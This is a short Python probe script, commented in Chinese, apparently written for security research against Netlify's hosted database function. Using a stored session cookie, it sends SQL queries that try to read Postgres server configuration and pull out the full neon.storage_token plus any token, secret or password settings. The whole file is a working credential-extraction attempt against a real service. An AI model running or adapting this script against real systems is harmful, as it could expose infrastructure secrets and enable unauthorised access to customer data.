# -*- coding: utf-8 -*-
"""pg_file_settings 直读探测:普通 owner 身份能否直接看到 neon.* 配置(含 storage_token)"""
import http.client, ssl, gzip, brotli, json, time, sys
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_A, SITE_A

ctx = ssl.create_default_context()
P = '/.netlify/functions/database-query'


def q(sql):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=40)
    h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0',
         'Accept-Encoding': 'br, gzip', 'Accept': 'application/json', 'Cookie': COOKIE_A,
         'Content-Type': 'application/json'}
    body = {'siteId': SITE_A, 'branchId': 'production', 'action': 'query', 'sql': sql}
    conn.request('POST', P, body=json.dumps(body).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    out = raw[:3000].decode('utf-8', 'ignore')
    conn.close()
    return st, out


tests = [
    ("select count(*) as n from pg_file_settings", 'file_settings 可读性'),
    ("select name, left(setting, 40) as setting from pg_file_settings where name like 'neon%'", 'neon* 配置(截断)'),
    ("select name, setting from pg_file_settings where name='neon.storage_token'", 'storage_token 完整值'),
    ("select name, setting from pg_file_settings where name like '%token%' or name like '%secret%' or name like '%password%'", 'token/secret/password 类'),
]
for sql, desc in tests:
    st, out = q(sql)
    print('%-32s [%d] %s' % (desc, st, out[:800]))
    print()
